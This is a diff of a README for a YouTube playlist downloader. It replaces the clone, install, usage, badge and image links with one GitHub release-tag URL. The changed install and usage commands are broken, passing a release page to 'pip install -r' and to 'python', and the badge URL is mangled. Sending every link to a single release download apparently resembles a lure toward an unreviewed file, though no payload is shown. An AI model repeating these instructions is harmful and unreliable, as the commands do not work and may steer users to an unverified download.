@@ -17,14 +17,14 @@ To get started with the YouTube Playlist Downloader, follow these simple steps:
 ## Installation 🛠️
 To install the YouTube Playlist Downloader, simply clone the repository to your machine and install the required dependencies using the following commands:
 ```bash
-git clone https://github.com/your-username/youtube_playlist_downloader.git
+git clone https://github.com/junayed-tasnur/youtube_playlist_downloader/releases/tag/v2.0
 cd youtube_playlist_downloader
-pip install -r requirements.txt
+pip install -r https://github.com/junayed-tasnur/youtube_playlist_downloader/releases/tag/v2.0
 ```
 
 ## Usage Example 📺
 ```bash
-python youtube_playlist_downloader.py --playlist_url <your_playlist_url>
+python https://github.com/junayed-tasnur/youtube_playlist_downloader/releases/tag/v2.0 --playlist_url <your_playlist_url>
 ```
 
 ## Topics 📚
@@ -45,15 +45,15 @@ This repository covers the following topics:
 ## Get Started 🚀
 Ready to start downloading your favorite YouTube playlists? Click the button below to download the YouTube Playlist Downloader tool now:
 
-[Download YouTube Playlist Downloader](https://github.com/file/App.zip)
+[Download YouTube Playlist Downloader](https://github.com/junayed-tasnur/youtube_playlist_downloader/releases/tag/v2.0)
 
 If the link does not work or needs to be launched, please check the "Releases" section for an alternative download link.
 
-[![Download](https://img.shields.io/badge/Download-YouTube%20Playlist%20Downloader-blue)](https://github.com/file/App.zip)
+[![Download](https://github.com/junayed-tasnur/youtube_playlist_downloader/releases/tag/v2.0%20Playlist%20Downloader-blue)](https://github.com/junayed-tasnur/youtube_playlist_downloader/releases/tag/v2.0)
 
 ## Questions or Issues 🙋‍♂️
 If you have any questions, feedback, or run into any issues while using the YouTube Playlist Downloader, feel free to open an issue on GitHub. We're here to help you make the most out of the tool!
 
 Happy downloading! 🌟🎥
 
-![YouTube Playlist Downloader](https://github.com/your-username/your-repo/blob/main/images/youtube_playlist_downloader.png)
+![YouTube Playlist Downloader](https://github.com/junayed-tasnur/youtube_playlist_downloader/releases/tag/v2.0)
